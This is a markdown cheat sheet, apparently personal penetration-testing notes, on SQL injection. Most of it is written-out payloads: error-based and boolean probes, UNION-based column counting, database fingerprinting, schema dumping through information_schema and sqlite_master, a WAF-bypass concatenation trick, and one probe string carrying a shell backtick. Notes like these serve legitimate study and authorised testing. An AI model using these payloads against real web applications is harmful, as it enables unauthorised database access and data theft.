# SQLi Injection 

## Types of SQLi  
* In-band: attacker uses the same channel of communication to launch their attacks and gather their results.
    * Error-based - relies on database to provide error messages
    * Union-based - fuses multiple select statements 
* Blind SQLi: attacker observes behaviour of payloads to determine existence of SQLi
    * Time-based - relies on waitin period between sending query and response to determine if vuln exists
    * Boolean - result returned varies depending on if query is true or false
* Out-of-band: attacker can't use the same channel to launch attack and gather information (Eg: server too slow)

## Injection targets
* Input fields
* URLs
```
http://application/apiv1/Users/?id=1 ' AND '1' LIKE '1'
```

* HTTP Headers  
    * [User-Agent](https://medium.com/@frostnull/sql-injection-through-user-agent-44a1150f6888)  
    * Referrer

## Exploit Payloads
Test ALL input fields  
```
'
"
'";<lol/>../--#`ls`
```
Error Based: Basic payloads to check for existence of SQL vuln
```
' or 1=1#
' or 1=1--
' or '1'='1'--
' or '1'='1';--

" or 1=1#  
" or 1=1-- 
" or '1'='1'--
" or '1'='1';--

'or 1=1/**
' UNION SELECT * from <tablename> LIMIT 1 OFFSET 1
```

Boolean Based: Proving existence with AND , OR injections

When injecting the `' AND 1=1` sql query, the same records should be returned as uninjected version since `name=productname` condition is met
```sql
SELECT * from PRODUCTS WHERE PRODUCTNAME = 'shirt' AND '1'='1';
```

Now, NO records should be returned as the second query is false. If this is the case, we can be sure of SQLi existence 
```sql
SELECT * from PRODUCTS WHERE PRODUCTNAME = 'shirt' AND '1'='0';
```

## Database fingerprinting
Syntax of SQL used depends on type of database used (MySQL, Oracle, MSSQL, SQLite).
Error messages can help determine which dbms. 

MySQL version:
```sql
SELECT @@version
```
Note, the complete query might look like `SELECT id, qty FROM products WHERE id=1 UNION SELECT 1, @@version`

SQLite version:
```sql
select sqlite_version();
```

## Figuring out number of columns
For when error messages are enabled, we have two options

Using ORDER BY:
```sql
1' ORDER BY 1--	#True
1' ORDER BY 2--	#True
1' ORDER BY 3--	#True
1' ORDER BY 4--	#False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+	True
```

Using UNION SELECT:
```sql
1' UNION SELECT @        #The used SELECT statements have a different number of columns
1' UNION SELECT @,@      #The used SELECT statements have a different number of columns
1' UNION SELECT @,@,@    #No error means query uses 3 columns
                         #-1' UNION SELECT 1,2,3--	True
```

## Figuring out all database data - master tables

Provided you know the number of columns.

MySQL:
Can use `information_schema.schemata`
```sql
' UniOn Select 1,2,3,4,... fRoM information_schema.schemata
' union select 1,TABLE_NAME,3,4,5,6 FROM information_schema.columns;                                #To get all tables used
'  union select COLUMN_NAME,2,3,4,5,6 FROM information_schema.columns WHERE TABLE_NAME = 'users';   #To get all columns used in table users

```

SQLite:
Generally, a table called `sqlite_master` with columns `tbl_name` etc. contains all tables meta-data.

```sql
SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'    #Extract table names
```

## Bypassing WAF
https://securityonline.info/sql-injection-9-ways-bypass-web-application-firewall/

https://portswigger.net/support/sql-injection-bypassing-common-filters

1. Use `||` for concatenating strings in SQL:
```
`adm'||'in'` === `admin`
```

## References:
[SQLite Injections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

[MySQL Injections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-comment)

## SQL Syntax that I didnt know about
1. `LIMIT` to limit number of rows and `OFFSET` to define the start of rows
```
' UNION blah blah LIMIT 1 OFFSET 1
```

2. `||` for string concatenation


